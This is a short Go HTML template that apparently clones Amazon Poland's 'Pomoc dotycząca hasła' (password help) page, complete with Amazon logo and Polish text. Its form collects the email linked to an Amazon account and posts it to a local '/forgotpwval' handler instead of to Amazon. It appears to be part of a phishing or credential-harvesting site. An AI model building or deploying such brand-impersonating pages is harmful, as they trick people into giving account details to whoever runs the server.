{{template "base" .}} 


{{define "title"}}  {{end}}



{{define "content"}}

<center>
    <a href="https://www.amazon.pl/">
            <img alt="Qries" src="https://www.synointcdn.com/wp-content/uploads/2019/04/Amazon-Logo-PNG.png"
            width=160" height="70">
        </a>

        </center>
<center>
  <div>
    <center><h1> Pomoc dotycząca hasła </h1></center>
    <center><h4> Wprowadź adres e-mail lub numer telefonu komórkowego powiązany z kontem Amazon. </h4></center>
      <center>     
      
      
          <form action="/forgotpwval" method="POST">
      <label for="email">Email:</label>
      <input type="text" id="email" name="email"><br>
      <input type="submit" value="Send Reset Email">
      </form>

     
    </center>
  </div>
  <h2>Czy Twój adres e-mail lub numer telefonu <br> komórkowego uległ zmianie?</h2>
  <h4>Jeśli nie używasz już adresu e-mail powiązanego z Twoim <br>kontem Amazon, możesz odzyskać dostęp do konta,<br> kontaktując się z działem obsługi klienta.</h4>

</center>


{{if .Form}}
<ul class="error">
{{ range $key, $value := .Form.Errors }}
   <li><strong>{{ $key }}</strong>: {{ $value }}</li>
{{ end }}
<ul>
{{end}}

{{end}}



